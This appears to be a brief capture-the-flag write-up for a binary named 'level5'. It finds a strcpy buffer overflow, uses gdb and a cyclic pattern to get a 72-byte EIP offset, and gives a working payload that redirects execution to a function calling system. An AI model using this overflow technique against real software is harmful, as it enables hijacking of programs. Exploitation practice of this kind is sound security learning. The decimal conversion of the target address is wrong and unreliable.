After anaylizing the disasembled main:
We got a n and m functions
Only n is interesting because it calls a system function

The main is using strcpy to copy the first argument to a buffer.
so we can use a buffer overflow to make the strcpy copy the address of the system function to the buffer.

let's find the offset eip with gdb and the help of this tool https://wiremask.eu/tools/buffer-overflow-pattern-generator/:

make a pattern with a length of 100 bytes
run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
info register eip
eip            0x41346341	0x41346341

the offset is 72 bytes

the n address is 0x08048454(134513780 in decimal)

let's create the payload:
python -c 'print "A" * 72 + "\x54\x84\x04\x08"' > /tmp/exploit

we're simply gonna give the input in the arguments of the program:

./level5 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')